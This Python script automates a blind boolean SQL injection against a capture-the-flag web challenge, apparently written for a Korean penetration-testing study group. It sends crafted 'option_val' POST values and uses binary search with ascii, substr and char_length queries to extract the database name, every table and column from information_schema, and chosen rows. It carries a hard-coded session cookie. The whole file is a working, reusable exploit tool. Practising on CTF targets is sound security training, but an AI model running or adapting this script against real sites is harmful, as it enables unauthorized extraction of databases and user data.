# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup as bs
from anytree import Node, RenderTree, search, LevelOrderGroupIter
from typing import List

attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_9/notice_list.php"
option_val: str = "title"

DB = None

def show() -> None:
    global DB

    for pre, fill, node in RenderTree(DB):
        print("%s%s" % (pre, node.name))

def save_data() -> None:
    try:
        f = open("C:\\Users\\jeony\\Desktop\\Code\\모의해킹 스터디 7기\\webApp\\8th\\sqli_9.txt", "w", encoding="utf-8")
        for pre, fill, node in RenderTree(DB):
            f.write("%s%s\n" % (pre, node.name))
    finally:
        f.close()

def sql_result(sql: str) -> bool:
    datas = {
        "option_val": sql,
        "board_result": "",
        "board_search": "%F0%9F%94%8D",
        "date_from": "",
        "date_to": ""
    }

    cookie = {
        "PHPSESSID": "ljpgngd09l3d7eoia7ob6gdk57"
    }

    response = requests.post(url=attack_url, cookies=cookie, data=datas)

    soup = bs(response.text, 'html.parser')
    check_sum = str(soup.find('tbody'))
    if "존재하지 않습니다." in check_sum:
        return False
    else:
        return True
    
def counting(query: str) -> int:
    global option_val
    l: int = 0
    r: int = 10000

    while (l <= r):
        num: int = (l + r) // 2
        sql: str = f"(({query}) < {num}) and {option_val}"

        if sql_result(sql):
            r = num - 1
        else:
            sql: str = f"(({query}) = {num}) and {option_val}"
            if sql_result(sql):
                return num
            else: l = num + 1
    
    return -1

def char_length(query: str) -> int:
    global option_val
    l: int = 0
    r: int = 100

    while (l <= r):
        num: int = (l + r) // 2
        sql: str = f"((char_length(({query}))) < {num}) and {option_val}"

        if sql_result(sql):
            r = num - 1
        else:
            sql = f"((char_length(({query}))) = {num}) and {option_val}"
            if sql_result(sql):
                return num
            else: l = num + 1

def find_name(query: str, length: int) -> str:
    tmp: List[chr] = []

    for i in range(length):
        l: int = 0
        r: int = 128

        while (l <= r):
            num: int = (l + r) // 2
            sql: str = f"(ascii(substr(({query}), {i + 1}, 1)) < {num}) and {option_val}"

            if sql_result(sql):
                r = num - 1
            else:
                sql = f"(ascii(substr(({query}), {i + 1}, 1)) = {num}) and {option_val}"
                if sql_result(sql):
                    tmp.append(chr(num))
                    break
                else: l = num + 1
    return "".join(tmp)

def find_db() -> None:
    global DB

    print(f"database searching...")
    query = "select database()"
    length = char_length(query)
    name = find_name(query, length)
    DB = Node(name)

def find_table() -> None:
    global DB

    print(f"table searching...")

    query: str = f"select count(table_name) from information_schema.tables"
    cnt = counting(query)

    for j in range(cnt):
        print(f"{j} table searching...")

        query = f"select table_name from information_schema.tables limit {j}, 1"
        res = char_length(query)
        name = find_name(query, res)
        table = Node(name, parent=DB)

def find_parent_table(column: str) -> Node:
    global DB

    tree_lst = [[node.name for node in children] for children in LevelOrderGroupIter(DB)]
    table_node_lst = tree_lst[1]

    for i in range(len(table_node_lst)):
        query = f"((select count({column}) from {table_node_lst[i]}) > 0) and title"
        # column 이름이 겹치는 경우는 처리 못함
        if sql_result(query):
            parent = search.find(DB, filter_= lambda node: node.name == table_node_lst[i])
            print(f"parent: {parent}, child: {column}")
            return Node(column, parent=parent)
    else:
        parent = search.find(DB, filter_= lambda node: node.name == table_node_lst[0])
        print(f"tmp parent: {parent}, child: {column}")
        return Node(column, parent=parent)
    
def find_column() -> None:
    global DB

    query: str = f"select count(column_name) from information_schema.columns"
    cnt = counting(query)

    for k in range(cnt):
        print(f"{k} column searching...")

        query = f"select column_name from information_schema.columns limit {k}, 1"
        length = char_length(query)

        name = find_name(query, length)
        
        col = find_parent_table(name)

def find_data(table_name: str, col_name: str) -> None:
    global DB

    query: str = f"select count({col_name}) from {table_name}"
    cnt = counting(query)

    for l in range(cnt):
        print(f"{l} data searching...")
        query = f"select {col_name} from {table_name} limit {l}, 1"
        length = char_length(query)

        name = find_name(query, length)
        print(name)

def main1():
    try:
        find_db()
        show()

        find_table()
        show()
        
        find_column()
        show()

        save_data()
    except Exception as e:
        print(type(e))

def main2():
    table_name = input('table name: ')
    col_name = input('column name: ')

    find_data(table_name, col_name)

if __name__ == "__main__":
    main1()
    # main2()